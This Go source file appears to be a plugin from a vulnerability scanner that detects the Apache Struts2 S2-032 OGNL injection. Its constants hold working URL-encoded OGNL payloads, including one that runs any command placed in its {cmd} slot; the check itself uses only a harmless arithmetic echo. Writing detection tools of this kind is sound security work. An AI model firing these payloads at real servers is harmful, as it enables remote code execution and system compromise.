/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package struts

import (
	"context"
	"strconv"
	"strings"
	"wscan/core/http"
	"wscan/core/model"
	"wscan/core/plugins/base"
	"wscan/core/utils"
	logger "wscan/core/utils/log"
)

var (
	CheckPoc032    = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=10086"
	WebPath032     = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding={encoding}"
	ExecPayload032 = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding={encoding}&cmd={cmd}"
)

type S032 struct {
}

func (*S032) Finger() *base.Finger {
	return &base.Finger{
		CheckAction: func(ctx context.Context, ab *base.Apollo) error {
			flow := ab.GetTargetFlow()
			logger.Infof("开始检测S2-032, %s", flow.Request.URL())
			r1 := utils.RandInt(1000000, 10000000)
			r2 := utils.RandInt(1000000, 10000000)
			payload := ExecPayload032
			payload = strings.Replace(payload, "{cmd}", "echo `expr {{r1}} + {{r2}}`", -1)
			payload = strings.Replace(payload, "{{r1}}", strconv.Itoa(r1), -1)
			payload = strings.Replace(payload, "{{r2}}", strconv.Itoa(r2), -1)
			req, err := http.NewRequest("GET", utils.UrlJoinPath(flow.Request.URL().String(), payload), nil)
			if err != nil {
				logger.Error(err)
				return nil
			}
			res, err := ab.HTTPClient.Respond(context.TODO(), req)
			if err != nil {
				return nil
			}

			if strings.Contains(res.Text, strconv.Itoa(r1+r2)) {
				v := ab.NewWebVuln(req, res, nil)
				if v != nil {
					v.SetTargetURL(flow.Request.URL())
					v.Payload = payload
					ab.OutputVuln(v)
				}
			}
			return nil
		},
		Channel: "web-directory",
		Binding: &model.VulnBinding{ID: "struts/s2-032/default", Plugin: "struts/s2-032", Category: "struts/s2-032"},
	}
}
